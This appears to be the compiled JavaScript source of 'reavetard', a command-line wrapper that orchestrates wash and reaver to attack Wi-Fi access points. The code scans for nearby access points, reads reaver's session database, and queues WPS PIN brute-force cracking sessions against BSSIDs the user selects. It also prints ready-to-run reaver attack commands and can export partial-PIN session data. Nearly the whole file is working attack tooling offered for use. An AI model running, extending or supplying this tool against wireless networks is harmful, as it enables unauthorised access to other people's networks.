// Generated by CoffeeScript 1.3.3
(function() {
  var ReaverQueueManager, actionPrompt, attackReview, cli, config, db, parseOptions, reviewTargets, rtard, runRDBQuery, runWashScan, startAttack, wash,
    _this = this,
    __indexOf = [].indexOf || function(item) { for (var i = 0, l = this.length; i < l; i++) { if (i in this && this[i] === item) return i; } return -1; };

  rtard = require('commander');

  cli = require('./cli');

  db = require('./db');

  wash = require('./wash');

  ReaverQueueManager = require('./reaver').ReaverQueueManager;

  config = require('./config');

  runWashScan = function(iface, scan) {
    var rdb, stations, w, _ref, _ref1;
    if (scan == null) {
      scan = true;
    }
    stations = {
      complete: [],
      inProgress: [],
      noHistory: []
    };
    rdb = new db((_ref = rtard.reaverPath) != null ? _ref : config.REAVER_DEFAULT_PATH, (_ref1 = rtard.rdbFile) != null ? _ref1 : config.REAVER_DEFAULT_DBFILE);
    if (iface == null) {
      iface = config.DEFAULT_INTERFACE;
    }
    w = new wash(config.WASH_DEFAULT_ARGS(iface, scan));
    process.on('exit', function() {
      return w.stop();
    });
    cli._c.foreground(250);
    rtard.prompt(' *** Press enter to move on to next step ***', function() {
      w.stop();
      return process.nextTick(function() {
        return reviewTargets.apply(null, [stations]);
      });
    });
    w.on('ap', function(station) {
      return rdb.checkSurvey(station.bssid, function(err, rows) {
        var device, k, v;
        if (!err && rows.length > 0) {
          device = {
            name: rows[0].device_name,
            manufacturer: rows[0].manufacturer,
            model: rows[0].model_name,
            number: rows[0].model_number
          };
          for (k in device) {
            v = device[k];
            if (v !== '') {
              station.device = device;
            }
          }
        }
        return rdb.checkHistory(station.bssid, function(err, rows) {
          var _ref2, _ref3;
          if (err) {
            console.error(errd);
          }
          if (rows.length > 0) {
            _ref2 = rows[0];
            for (k in _ref2) {
              v = _ref2[k];
              if ((_ref3 = station[k]) == null) {
                station[k] = v;
              }
            }
            station.session = rdb.loadSession(station.bssid);
            if (station.attempts >= 11000 || station.session.phase === 2) {
              stations.complete.push(station);
              station.category = 'C';
            } else {
              stations.inProgress.push(station);
              station.category = 'W';
            }
          } else {
            stations.noHistory.push(station);
            station.category = 'N';
          }
          return cli.washHit(station, station.category);
        });
      });
    });
    w.on('error', function() {
      return console.error("ERROR: " + arguments);
    });
    w.start();
    return cli.cwrite('magenta', ' Wash scan has been started, now waiting for AP data...\n\n');
  };

  runRDBQuery = function() {
    var rdb, stations, _ref, _ref1;
    stations = {
      complete: [],
      inProgress: [],
      noHistory: []
    };
    rdb = new db((_ref = rtard.reaverPath) != null ? _ref : config.REAVER_DEFAULT_PATH, (_ref1 = rtard.rdbFile) != null ? _ref1 : config.REAVER_DEFAULT_DBFILE);
    return rdb.getHistory(function(err, history) {
      if (err) {
        throw err;
      }
      return rdb.getSurvey(function(err, survey) {
        var bssid, joined, k, row, station, v, _i, _j, _len, _len1, _name, _ref2, _ref3;
        if (err) {
          throw err;
        }
        joined = {};
        for (_i = 0, _len = history.length; _i < _len; _i++) {
          row = history[_i];
          joined[row.bssid] = row;
        }
        for (_j = 0, _len1 = survey.length; _j < _len1; _j++) {
          row = survey[_j];
          if ((_ref2 = joined[_name = row.bssid]) == null) {
            joined[_name] = {};
          }
          for (k in row) {
            v = row[k];
            joined[row.bssid][k] = v;
          }
          joined[row.bssid].locked = joined[row.bssid].locked === 1;
        }
        for (bssid in joined) {
          station = joined[bssid];
          station.session = rdb.loadSession(bssid);
          if (station.attempts != null) {
            if (station.attempts === 11000 || ((_ref3 = station.session) != null ? _ref3.phase : void 0) === 2) {
              stations.complete.push(station);
              station.category = 'C';
            } else {
              stations.inProgress.push(station);
              station.category = 'W';
            }
          } else {
            stations.noHistory.push(station);
            station.category = 'N';
          }
          cli.washHit(station, station.category, true);
        }
        return rtard.prompt('\n (Press enter to continue to target review)', function() {
          return process.nextTick(function() {
            return reviewTargets.apply(null, [stations]);
          });
        });
      });
    });
  };

  reviewTargets = function(stations, reprompt) {
    var indexed,
      _this = this;
    if (reprompt == null) {
      reprompt = false;
    }
    if (!reprompt) {
      cli.clear();
      indexed = cli.targetReviewTable(stations);
      cli.reviewSelectors();
      cli._c.foreground(255);
    } else {
      console.log(' Your input did not include any valid selections, please try again...');
    }
    return rtard.prompt(' Please enter the #/selector for each target that you wish to select: ', function(input) {
      var isfirst, sel, selected, selections, station, _i, _j, _len, _len1, _ref, _ref1;
      cli._c.down(1).erase('line');
      selections = input.match(/-?\d+/g);
      selected = [];
      for (_i = 0, _len = indexed.length; _i < _len; _i++) {
        station = indexed[_i];
        if (__indexOf.call(selections, '0') >= 0 || (_ref = "" + station.tableIndex, __indexOf.call(selections, _ref) >= 0)) {
          selected.push(station);
        } else {
          switch (station.category) {
            case 'C':
              if (__indexOf.call(selections, '-1') >= 0) {
                selected.push(station);
              }
              break;
            case 'W':
              if (__indexOf.call(selections, '-2') >= 0) {
                selected.push(station);
              }
              break;
            case 'N':
              if (__indexOf.call(selections, '-3') >= 0) {
                selected.push(station);
              }
          }
        }
      }
      cli.clear().title(true).cwrite(250, " You have selected the following " + selected.length + " station(s): \n ");
      isfirst = true;
      for (_j = 0, _len1 = selected.length; _j < _len1; _j++) {
        sel = selected[_j];
        if (!isfirst) {
          cli.cwrite(250, ', ');
        } else {
          isfirst = false;
        }
        cli.cwrite(cli.STATION_COLORS[(_ref1 = sel.category) != null ? _ref1 : 'N'], "" + sel.essid);
      }
      cli.cdwrite('bright', 'blue', '\n\n What would you like reavetard to do with these station(s)?\n').cdwrite('reset', 245, ' -----------------------------------------------------------------------\n').targetActions();
      cli._c.foreground('blue');
      return actionPrompt(selected);
    });
  };

  actionPrompt = function(selected) {
    return rtard.prompt('\n Please enter one of the letters in ()\'s, or entire title, of your desired action: ', function(choice) {
      var s, _i, _len;
      switch (choice) {
        case 'a':
        case 'attack':
          return process.nextTick(function() {
            return startAttack.apply(null, [selected]);
          });
        case 'j':
        case 'json':
          cli.cwrite(250, ' Would you like to include the session file key data?\n');
          cli.cwrite('yellow', ' Doing so can add 11k partial pins for every station with session data!\n');
          cli._c.foreground(250);
          return rtard.confirm(" What'll it be, champ? (y)ay or (n)ay: ", function(showPins) {
            var s, _i, _len;
            if (!showPins) {
              for (_i = 0, _len = selected.length; _i < _len; _i++) {
                s = selected[_i];
                if (s.session != null) {
                  s.session.Pins = 'removed';
                }
              }
            }
            console.log(JSON.stringify(selected));
            return process.exit();
          });
        case 'u':
        case 'usage':
          for (_i = 0, _len = selected.length; _i < _len; _i++) {
            s = selected[_i];
            config.REAVER_DEFAULT_ARGS;
            console.log("reaver -i mon0 -b " + s.bssid + " " + (s.channel ? '-c ' + s.channel : void 0) + " -vv -a -N -S");
          }
          return process.exit();
        case 'x':
        case 'exit':
          console.log('goodbye.');
          return process.exit();
        default:
          console.log('You didn\'t enter one of the available letters/words. Try again.\n');
          return process.nextTick(function() {
            return actionPrompt(selected);
          });
      }
    });
  };

  startAttack = function(selected) {
    var atkQueue, attackPrompt, pinterval,
      _this = this;
    atkQueue = new ReaverQueueManager(selected, rtard["interface"]);
    atkQueue.on('stopped', function(reason) {
      var _ref, _ref1;
      if (reason === 'paused') {
        return rtard.prompt(' *** Reavetard is paused, press enter to resume ***', function() {
          return process.nextTick(atkQueue.start);
        });
      } else if (reason !== 'killed') {
        if ((((_ref = atkQueue.priority) != null ? _ref.length : void 0) != null) >= 1 || (((_ref1 = atkQueue.secondary) != null ? _ref1.length : void 0) != null) >= 1) {
          return process.nextTick(atkQueue.start);
        } else {
          return attackReview(atkQueue.finished);
        }
      }
    });
    attackPrompt = function() {
      cli._c.display('hidden');
      rtard.prompt(': ', function(cmd) {
        switch (cmd) {
          case 'h':
          case 'help':
            cli.attackCommands();
            break;
          case 'n':
          case 'next':
            atkQueue.stop('skipped');
            break;
          case 'p':
          case 'pause':
            atkQueue.stop('paused');
            break;
          case 'x':
          case 'exit':
            atkQueue.stop('killed');
            process.exit();
            break;
        }
        return process.nextTick(attackPrompt);
      });
      return cli._c.display('reset').attackPrompt;
    };
    atkQueue.start();
    process.on('exit', function() {
      return atkQueue.stop('killed');
    });
    return pinterval = setInterval((function() {
      var pact, pmets, pstat, _ref;
      if ((atkQueue.reaver != null) && (atkQueue.active != null)) {
        if (atkQueue.prevHealth != null) {
          _ref = atkQueue.prevHealth, pact = _ref[0], pstat = _ref[1], pmets = _ref[2];
          if (pact.bssid === atkQueue.active.bssid) {
            if (!pstat.associated && !atkQueue.reaver.status.associated) {
              atkQueue.stop('idle');
            }
            if (pmets.totalChecked === atkQueue.reaver.metrics.totalChecked) {
              atkQueue.stop('idle');
            }
          }
        }
        return atkQueue.prevHealth = [atkQueue.active, atkQueue.reaver.status, atkQueue.reaver.metrics];
      } else if (atkQueue.priority.length === 0 && atkQueue.secondary.length === 0) {
        attackReview(atkQueue.finished);
        return clearInterval();
      }
    }), config.HEALTH_CHECK_INTERVAL);
  };

  attackReview = function(fin) {
    var s, _i, _len;
    for (_i = 0, _len = fin.length; _i < _len; _i++) {
      s = fin[_i];
      if (s.session != null) {
        s.session.Pins = 'removed';
      }
      if (s.success) {
        cli.cwrite('green', JSON.stringify(s));
      } else {
        cli.cwrite('red', JSON.stringify(s));
      }
    }
    return process.exit();
  };

  parseOptions = function(args) {
    rtard.version('0.1.0').option('-i, --interface <iface>', "Choose WLAN interface [" + config.DEFAULT_INTERFACE + "]", config.DEFAULT_INTERFACE).option('-r, --reaver-path <path>', "Set path to your reaver.db and session files [" + config.REAVER_DEFAULT_PATH + "]", config.REAVER_DEFAULT_PATH).option('-d, --rdb-file <filename>', "Set the filename of your reaver database [" + config.REAVER_DEFAULT_DBFILE + "]", config.REAVER_DEFAULT_DBFILE).option('-D, --no-rdb-access', 'Do not attempt to access reaver\'s database');
    rtard.command('scan [silent]').description('Spawn a new wash process to generate a list of nearby targets').action(function(silent) {
      var scan;
      if (silent == null) {
        silent = false;
      }
      cli.clear().title().cwrite('blue', ' Scan command chosen. Initializing wash survey...\n');
      if (silent) {
        cli.cwrite(170, ' SILENT MODE ENABLED - Will not send probes to access points\n');
        scan = false;
      } else {
        scan = true;
      }
      return process.nextTick(function() {
        var _ref;
        return runWashScan((_ref = rtard["interface"]) != null ? _ref : void 0, scan);
      });
    });
    rtard.command('rdbq').description('Pull all past targets from database and/or session files').action(function() {
      if (!rtard.rdbAccess) {
        throw 'Cannot query a database without accessing it! Try removing -D option';
      }
      cli.clear().title().cwrite('blue', ' Reaver DB Query command chosen, Initializing query... \n\n');
      return process.nextTick(runRDBQuery);
    });
    rtard.command('attack <bssid1,b2,b3...>').description('Initiate reaver cracking session on one or more targets').action(function(bssids) {
      var bssid, stations, _i, _len, _ref;
      cli.clear().title().cwrite('blue', ' Attack command chosen. The following BSSIDs were provided: \n');
      _ref = bssids.split(',');
      for (_i = 0, _len = _ref.length; _i < _len; _i++) {
        bssid = _ref[_i];
        stations = {
          bssid: bssid
        };
      }
      if (!Array.isArray(stations)) {
        stations = [stations];
      }
      cli.cwrite(250, " " + (JSON.stringify(stations)) + "\n").cwrite('magenta', " Initializing new attack queue on " + rtard["interface"] + "...\n");
      return process.nextTick(function() {
        return startAttack(stations);
      });
    });
    if (typeof config.CUSTOM_SETUP === 'function') {
      return config.CUSTOM_SETUP(function(okay, err) {
        if (okay) {
          return rtard.parse(args);
        } else {
          throw err;
        }
      });
    } else {
      return rtard.parse(args);
    }
  };

  if (module === require.main) {
    parseOptions(process.argv);
  } else {
    module.exports = {
      parseOptions: parseOptions,
      startAttack: startAttack,
      reviewTargets: reviewTargets,
      runRDBQuery: runRDBQuery,
      runWashScan: runWashScan
    };
  }

}).call(this);
